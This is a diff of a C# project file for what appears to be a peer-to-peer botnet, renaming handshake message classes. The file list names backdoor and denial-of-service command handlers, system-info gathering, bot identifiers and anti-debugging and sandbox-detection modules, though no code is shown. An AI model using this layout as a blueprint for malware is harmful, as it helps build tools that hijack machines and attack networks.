@@ -62,10 +62,12 @@
     <Compile Include="Network\DnsEndPoint.cs" />
     <Compile Include="Network\Protocol\Handlers\Command\BackdoorHandler.cs" />
     <Compile Include="Network\Protocol\Handlers\Command\DosAttackHandler.cs" />
+    <Compile Include="Network\Protocol\Handlers\System\HelloAckMessageHandler.cs" />
     <Compile Include="Network\Protocol\Handlers\System\PingPongMessageHandler.cs" />
     <Compile Include="Network\Protocol\Messages\Command\BackdoorMessage.cs" />
     <Compile Include="Network\Protocol\Messages\Command\GetSystemInfo.cs" />
     <Compile Include="Network\Protocol\Messages\Command\DosAttackMessage.cs" />
+    <Compile Include="Network\Protocol\Messages\System\HelloAckMessage.cs" />
     <Compile Include="Network\Protocol\Messages\System\PingPongMessage.cs" />
     <Compile Include="Network\Sockets.cs" />
     <Compile Include="Network\Comunication\TCP\TcpClient.cs" />
@@ -91,7 +93,7 @@
     <Compile Include="Network\Protocol\Messages\MessageMetadata.cs" />
     <Compile Include="Network\BotIdentifier.cs" />
     <Compile Include="Network\InvalidMessageException.cs" />
-    <Compile Include="Network\Protocol\Messages\System\HelloReplyMessage.cs" />
+    <Compile Include="Network\Protocol\Messages\System\HelloAckSynMessage.cs" />
     <Compile Include="Network\Protocol\Peers\BotPackage.cs" />
     <Compile Include="Network\Protocol\Peers\DesparateModeActivatedEventArgs.cs" />
     <Compile Include="Network\Protocol\Peers\PeerList.cs" />
@@ -103,14 +105,14 @@
     <Compile Include="System\Evation\AntiDebugging.cs" />
     <Compile Include="System\Evation\SandboxDetection.cs" />
     <Compile Include="Network\Comunication\IMessageSender.cs" />
-    <Compile Include="Network\Protocol\Handlers\System\HelloReplyMessageHandler.cs" />
+    <Compile Include="Network\Protocol\Handlers\System\HelloAckSynMessageHandler.cs" />
     <Compile Include="Network\Protocol\Handlers\System\InvalidMessageHandler.cs" />
     <Compile Include="Network\Protocol\Messages\InvalidMessage.cs" />
     <Compile Include="Network\Comunication\Listeners\MessageListener.cs" />
     <Compile Include="Network\Protocol\Peers\PeerManager.cs" />
     <Compile Include="Network\Protocol\Peers\PeerInfo.cs" />
     <Compile Include="Crypto\RsaUtils.cs" />
-    <Compile Include="Network\Protocol\Handlers\System\HelloMessageHandler.cs" />
+    <Compile Include="Network\Protocol\Handlers\System\HelloSynMessageHandler.cs" />
     <Compile Include="Network\Protocol\Handlers\System\GetPeerListReplyMessageHandler.cs" />
     <Compile Include="Network\Protocol\Handlers\System\GetPeerListMessageHandler.cs" />
     <Compile Include="Network\Protocol\Handlers\System\MessageHandler.cs" />
@@ -139,7 +141,7 @@
     <Compile Include="Workers\IWorker.cs" />
     <Compile Include="Network\Protocol\Messages\System\GetPeerListMessage.cs" />
     <Compile Include="Utils\Guard.cs" />
-    <Compile Include="Network\Protocol\Messages\System\HelloMessage.cs" />
+    <Compile Include="Network\Protocol\Messages\System\HelloSynMessage.cs" />
     <Compile Include="Network\Protocol\Messages\Message.cs" />
     <Compile Include="Workers\ScheduledAction.cs" />
     <Compile Include="Workers\TimedWorker.cs" />
